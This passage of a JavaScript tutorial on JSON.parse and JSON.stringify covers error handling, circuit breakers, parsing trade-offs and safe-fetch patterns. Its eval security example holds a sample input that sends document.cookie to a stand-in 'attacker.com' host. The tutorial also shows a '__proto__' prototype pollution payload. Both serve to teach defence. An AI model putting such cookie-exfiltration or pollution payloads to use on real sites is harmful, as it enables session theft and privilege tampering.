- **Uptime:** 99.95% dashboard availability
- **User Complaints:** Reduced from 156 to 0 (even during API outages)
- **Cache Hit Rate:** 78% (reduced API calls by 78%)
- **Performance:** 40% faster load time (due to caching)
- **Monitoring:** Added health check dashboard showing API status in real-time
- **Alerts:** Set up Slack notifications for API errors (>10% error rate)

**Additional Improvements:**

1. **Circuit Breaker Pattern:**
   ```javascript
   // If API fails 5 times in a row, stop calling for 5 minutes
   class CircuitBreaker {
     constructor(threshold = 5, timeout = 5 * 60 * 1000) {
       this.failureCount = 0;
       this.threshold = threshold;
       this.timeout = timeout;
       this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
       this.nextAttempt = Date.now();
     }

     async call(fn) {
       if (this.state === 'OPEN') {
         if (Date.now() < this.nextAttempt) {
           throw new Error('Circuit breaker is OPEN');
         }
         this.state = 'HALF_OPEN';
       }

       try {
         const result = await fn();
         this.onSuccess();
         return result;
       } catch (error) {
         this.onFailure();
         throw error;
       }
     }

     onSuccess() {
       this.failureCount = 0;
       this.state = 'CLOSED';
     }

     onFailure() {
       this.failureCount++;
       if (this.failureCount >= this.threshold) {
         this.state = 'OPEN';
         this.nextAttempt = Date.now() + this.timeout;
       }
     }
   }
   ```

2. **Response Schema Validation:**
   ```javascript
   const weatherSchema = {
     type: 'object',
     required: ['temp', 'condition'],
     properties: {
       temp: { type: 'number' },
       condition: { type: 'string' },
       humidity: { type: 'number' }
     }
   };

   function validateWeatherData(data) {
     if (typeof data.temp !== 'number') {
       throw new Error('Invalid temp field');
     }
     if (typeof data.condition !== 'string') {
       throw new Error('Invalid condition field');
     }
     return true;
   }
   ```

**Post-Mortem Lessons:**

1. **Never trust external APIs** - always validate HTTP status, Content-Type, and response structure
2. **Always handle JSON.parse errors** - use try-catch and validate before parsing
3. **Implement caching** - reduces dependency on flaky APIs
4. **Add health monitoring** - detect API issues before users do
5. **Graceful degradation** - show fallback UI instead of crashing
6. **Test error scenarios** - simulate API failures in integration tests


</details>

---


<details>
<summary><strong>⚖️ Trade-offs: JSON.stringify() and JSON.parse()</strong></summary>


**1. JSON.parse() vs eval() (Security)**

| Aspect | JSON.parse() | eval() |
|--------|-------------|--------|
| **Security** | Safe (JSON-only) | **DANGEROUS** (executes code) |
| **Performance** | Fast (optimized parser) | Slower (full JS evaluation) |
| **Validation** | Strict JSON syntax | Any valid JavaScript |
| **Error Type** | SyntaxError | Any error |
| **Use Case** | Deserialize JSON | **NEVER for JSON** |
| **Attack Surface** | Very small | Unlimited |

**Example Attack:**
```javascript
const userInput = '{"name":"Alice"}; fetch("https://attacker.com?cookie=" + document.cookie)';

// ✅ JSON.parse safely rejects:
JSON.parse(userInput); // SyntaxError: Unexpected token ;

// ❌ eval executes malicious code:
eval('(' + userInput + ')'); // Sends cookies to attacker!
```

**Decision:** **ALWAYS use JSON.parse(), NEVER eval() for JSON**


</details>

---

**2. Validation Before vs After Parsing**

| Aspect | Validate Before | Validate After |
|--------|----------------|----------------|
| **Performance** | 2x parsing (validation + parse) | 1x parsing |
| **Error Detection** | Early (before parsing) | Late (after allocation) |
| **Memory** | Less (rejects invalid early) | More (parses invalid data) |
| **Code Complexity** | Higher (duplicate validation) | Lower (single pass) |

**Validate Before:**
```javascript
function safeParse(jsonString) {
  // Pre-validate (regex, length check, etc.)
  if (jsonString.length > 1_000_000) {
    throw new Error('JSON too large');
  }

  // Then parse
  return JSON.parse(jsonString);
}
```

**Validate After:**
```javascript
function safeParse(jsonString) {
  const data = JSON.parse(jsonString); // Parse first

  // Then validate structure
  if (!data.id || typeof data.name !== 'string') {
    throw new Error('Invalid structure');
  }

  return data;
}
```

**Decision Matrix:**
- **Untrusted input:** Validate before (size, basic syntax)
- **Trusted input:** Validate after (structure only)
- **Performance-critical:** Validate after (avoid double parsing)

---

**3. Reviver Function vs Post-Processing**

| Aspect | Reviver Function | Post-Processing |
|--------|-----------------|-----------------|
| **Performance** | Slower (function call per property) | Faster (manual iteration) |
| **Convenience** | Automatic (built-in) | Manual (custom code) |
| **Depth-First** | Yes (leaf-to-root) | Custom control |
| **Use Case** | Simple transformations | Complex logic |

**Reviver:**
```javascript
// Automatic date restoration
JSON.parse(json, (key, value) => {
  if (key.endsWith('At')) return new Date(value);
  return value;
});
```

**Post-Processing:**
```javascript
const data = JSON.parse(json);

// Manual date restoration (more control)
function restoreDates(obj) {
  for (const key in obj) {
    if (key.endsWith('At')) {
      obj[key] = new Date(obj[key]);
    }
    if (typeof obj[key] === 'object') {
      restoreDates(obj[key]); // Recursive
    }
  }
  return obj;
}

restoreDates(data);
```

**When to use each:**
- **Reviver:** Simple transformations (dates, BigInt), validation
- **Post-processing:** Complex logic, multiple passes, conditional transforms

---

**4. Strict vs Permissive Parsing**

| Aspect | Strict (JSON.parse) | Permissive (json5) |
|--------|-------------------|-------------------|
| **Syntax** | Standard JSON only | Comments, trailing commas, etc. |
| **Interoperability** | Universal | Limited |
| **Performance** | Faster | Slower |
| **Use Case** | APIs, production | Config files, development |

**Strict:**
```javascript
// ❌ Rejects non-standard JSON
JSON.parse('{"name": "Alice",}'); // SyntaxError (trailing comma)
```

**Permissive:**
```javascript
const JSON5 = require('json5');

// ✅ Allows comments, trailing commas, unquoted keys
JSON5.parse(`{
  // User configuration
  name: "Alice", // Trailing comma OK
}`);
```

**Decision:**
- **Production APIs:** Use strict JSON.parse (interoperability)
- **Config files:** Use JSON5 or YAML (developer-friendly)
- **User input:** Use strict (security)

---

**5. Different JSON Libraries**

| Library | Speed | Features | Trade-off |
|---------|-------|----------|-----------|
| **JSON.parse** | Fast | Basic | No circular refs, limited validation |
| **secure-json-parse** | Slower | Prototype pollution protection | 20% slower |
| **json5** | Slower | Comments, unquoted keys | 2-3x slower |
| **yaml** | Slowest | Rich syntax, references | 10x slower |
| **flatted** | Fast | Circular references | Non-standard format |

**Benchmarks:**
```javascript
const json = JSON.stringify({ /* 10KB data */ });

// JSON.parse: 50ms baseline
JSON.parse(json);

// secure-json-parse: 60ms (20% slower)
secureJsonParse(json);

// json5: 150ms (3x slower)
JSON5.parse(json);

// flatted: 55ms (10% slower, handles circular refs)
flatted.parse(flattedString);
```

**When to use:**
```javascript
// Use JSON.parse for standard APIs (fast, universal)
app.get('/api/users', (req, res) => {
  res.json(users); // Standard JSON
});

// Use secure-json-parse for untrusted input (safer)
app.post('/api/update', (req, res) => {
  const data = secureJsonParse(req.body); // Protected from prototype pollution
});

// Use json5 for configuration (human-friendly)
const config = JSON5.parse(fs.readFileSync('config.json5'));

// Use flatted for circular structures (serialization)
const circular = { name: 'obj' };
circular.self = circular;
const str = flatted.stringify(circular);
const restored = flatted.parse(str); // Works!
```

---

**Performance Decision Matrix:**

| Scenario | Choice | Reason |
|----------|--------|--------|
| **Public API** | JSON.parse | Fast, standard, universal |
| **User Input** | secure-json-parse | Protected from prototype pollution |
| **Config Files** | json5 or YAML | Human-readable, comments |
| **Circular Data** | flatted | Handles circular refs |
| **Performance-Critical** | JSON.parse | Fastest, no overhead |
| **Internal Services** | JSON.parse | Trust + speed |

---


<details>
<summary><strong>💬 Explain to Junior: JSON.stringify() and JSON.parse() Simplified</strong></summary>


**Simple Analogy:**

Think of **JSON.parse()** as a **translator** that converts text back into JavaScript objects:

- You have a blueprint (JSON string)
- JSON.parse reads the blueprint
- Creates a real object you can use

It's the **reverse** of JSON.stringify:
- `stringify`: Object → Text (for sending/storing)
- `parse`: Text → Object (for using)

**The Two Parameters Explained:**

1. **`text`** (required): The JSON string to convert
   ```javascript
   const json = '{"name":"Alice","age":30}';
   const user = JSON.parse(json);
   console.log(user.name); // 'Alice'
   ```

2. **`reviver`** (optional): Transform values as they're parsed
   ```javascript
   // Restore dates from strings
   JSON.parse(json, (key, value) => {
     if (key === 'createdAt') {
       return new Date(value); // Convert string to Date
     }
     return value;
   });
   ```

**Why You Need Error Handling:**

JSON.parse **throws an error** if JSON is invalid:

```javascript
// ❌ WRONG: No error handling (app crashes!)
const data = JSON.parse(userInput);

// ✅ CORRECT: Always use try-catch
try {
  const data = JSON.parse(userInput);
} catch (error) {
  console.error('Invalid JSON:', error.message);
  // Show error to user or use fallback
}
```

**Common Mistakes to Remember:**

| Mistake | What Happens | How to Fix |
|---------|-------------|------------|
| Invalid JSON syntax | **Error:** "Unexpected token" | Use try-catch, validate input |
| HTML instead of JSON | **Error:** "Unexpected token <" | Check Content-Type header |
| Prototype pollution (`__proto__`) | **Security risk:** All objects affected | Filter `__proto__` in reviver |
| Using eval() instead | **Security disaster:** Code execution | **Always use JSON.parse** |

**Interview Answer Template:**

> "JSON.parse converts JSON strings to JavaScript objects. It takes two parameters: **text** (the JSON string) and **reviver** (optional function to transform values during parsing).
>
> It's important to **always use try-catch** because JSON.parse throws **SyntaxError** if the JSON is invalid. Common errors include malformed syntax, trailing commas, single quotes, or receiving HTML instead of JSON (like 503 error pages).
>
> The **reviver function** is useful for restoring complex types like Dates (which are serialized as ISO strings) or validating values during parsing. It's called for each property in **leaf-to-root order** (deepest properties first).
>
> For **security**, never use eval() for JSON - it executes arbitrary code. JSON.parse is safe because it only recognizes JSON syntax. However, watch out for **prototype pollution** attacks (malicious `__proto__` properties). You can defend against this by filtering dangerous keys in the reviver.
>
> In production, always validate the **Content-Type** header and HTTP status before parsing to avoid parsing HTML error pages."

**Practice Pattern (Memorize This):**

```javascript
// The "Safe Parse" pattern - use this for API responses
async function safeFetch(url) {
  try {
    const response = await fetch(url);

    // 1. Check HTTP status
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }

    // 2. Validate Content-Type
    const contentType = response.headers.get('content-type');
    if (!contentType?.includes('application/json')) {
      throw new Error('Response is not JSON');
    }

    // 3. Parse safely
    const text = await response.text();
    return JSON.parse(text);

  } catch (error) {
    console.error('Fetch failed:', error.message);
    return null; // Or throw, depending on requirements
  }
}

// Use it like this:
const data = await safeFetch('/api/users');
if (data) {
  // Process data
}
```

**Reviver Function in Plain English:**

The reviver is called **after** each property is parsed, starting from the **deepest** properties:

```javascript
const json = '{"user":{"createdAt":"2024-01-15T00:00:00Z"}}';

JSON.parse(json, (key, value) => {
  console.log(`Key: "${key}"`);
  return value;
});

// Output order:
// Key: "createdAt"  (deepest first)
// Key: "user"       (then parent)
// Key: ""           (then root)
```

This lets you transform nested values before their parents see them.

**Why JSON.parse is Safe (vs eval):**

```javascript
const malicious = '{"name":"Alice"}; deleteAllData();';

// ✅ JSON.parse safely rejects:
JSON.parse(malicious);
// SyntaxError: Unexpected token ; in JSON
// Nothing executed!

// ❌ eval executes the code:
eval('(' + malicious + ')');
// Deletes all data! DISASTER!
```

**Rule:** **NEVER use eval() for JSON. ALWAYS use JSON.parse().**

**Key Gotcha: Prototype Pollution (usually blamed on the wrong step)**

```javascript
const attack = '{"__proto__":{"isAdmin":true}}';

JSON.parse(attack);

// JSON.parse() by itself does NOT pollute anything:
const user = {};
console.log(user.isAdmin); // undefined (NOT polluted)

// The danger only appears if you later feed the parsed object into an
// unsafe recursive merge/extend function. As a defensive habit anyway,
// filter dangerous keys before merging untrusted data:
JSON.parse(attack, (key, value) => {
  if (key === '__proto__') return undefined; // Block it
  return value;
});
```

**When to Use Reviver:**

- **Restore dates:** `new Date(value)` for date strings
- **Validate:** Check if value is in allowed range
- **Transform:** Convert strings to numbers, etc.
- **Security:** Block dangerous keys like `__proto__`

**Quick Reference Card:**

```javascript
// ALWAYS do this for API responses:
async function fetchData(url) {
  const response = await fetch(url);

  if (!response.ok) throw new Error('Bad HTTP status');

  const type = response.headers.get('content-type');
  if (!type?.includes('json')) throw new Error('Not JSON');

  try {
    return JSON.parse(await response.text());
  } catch (error) {
    throw new Error('Invalid JSON');
  }
}
```


</details>

---

## 📚 Additional Resources

- [MDN: JSON.stringify()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify)
- [MDN: JSON.parse()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse)
- [JSON.org](https://www.json.org/) - Official JSON specification
- [V8 JSON optimization blog](https://v8.dev/blog/json)
- [OWASP: Prototype Pollution](https://owasp.org/www-community/vulnerabilities/Prototype_Pollution)
- [secure-json-parse](https://github.com/fastify/secure-json-parse) - Library for safer parsing
- [flatted](https://github.com/WebReflection/flatted) - Circular reference handling
